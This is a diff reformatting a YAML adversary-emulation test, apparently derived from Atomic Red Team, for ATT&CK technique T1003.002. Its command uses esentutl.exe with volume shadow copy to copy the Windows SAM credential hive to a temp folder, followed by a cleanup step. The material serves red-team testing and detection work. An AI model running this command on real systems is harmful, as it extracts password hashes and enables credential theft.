@@ -1,16 +1,18 @@
-- id: c4389f69-78cd-5a4e-864f-4b68ad6fef29
+- requirements: []
   name: Soumaia ART Tests - esentutl.exe SAM copy
   description: 'Copy the SAM hive using the esentutl.exe utility
 
     This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc. (requires elevation)'
   tactic: credential-access
-  technique:
-    attack_id: T1003.002
-    name: 'OS Credential Dumping: Security Account Manager'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
-        cleanup: |-
-          del %temp%\SAM >nul 2>&1
+  technique_id: T1003.002
+  technique_name: 'OS Credential Dumping: Security Account Manager'
+  executors:
+  - cleanup:
+    - del %temp%\SAM >nul 2>&1
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
+  id: c4389f69-78cd-5a4e-864f-4b68ad6fef29
